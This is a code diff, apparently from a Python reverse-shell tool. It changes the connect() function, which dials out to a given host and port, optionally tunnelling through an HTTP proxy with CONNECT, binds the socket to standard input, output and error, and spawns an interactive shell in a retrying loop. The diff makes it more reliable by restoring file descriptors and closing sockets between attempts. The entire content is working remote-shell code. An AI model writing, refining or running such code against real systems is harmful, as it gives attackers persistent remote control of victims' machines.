@@ -30,26 +30,38 @@ def get_proxy():
 
 
 def connect(addr, port, shell, proxy):
+  save_in  = os.dup(0)
+  save_out = os.dup(1)
+  save_err = os.dup(2)
+
   while True:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        if proxy is not None:
-          print('Connecting via proxy %s:%d to %s:%d' % (
-            proxy[0], proxy[1], addr, port))
-          s.connect(proxy)
-          s.send(str.encode('CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n' % (
-            addr, port, addr, port)))
+      if proxy is not None:
+        print('Connecting via proxy %s:%d to %s:%d' % (
+          proxy[0], proxy[1], addr, port))
+        s.connect(proxy)
+        s.send(str.encode('CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n' % (
+          addr, port, addr, port)))
 
-        else:
-          print('Connecting directly to %s:%d' % (addr, port))
-          s.connect((addr, port))
+      else:
+        print('Connecting directly to %s:%d' % (addr, port))
+        s.connect((addr, port))
 
+      try:
         os.dup2(s.fileno(), 0)
         os.dup2(s.fileno(), 1)
         os.dup2(s.fileno(), 2)
         pty.spawn(shell)
 
+      finally:
+        os.dup2(save_in,  0)
+        os.dup2(save_out, 1)
+        os.dup2(save_err, 2)
+
     except Exception as e: print(e)
+    finally: s.close()
+
     time.sleep(1)
 
 
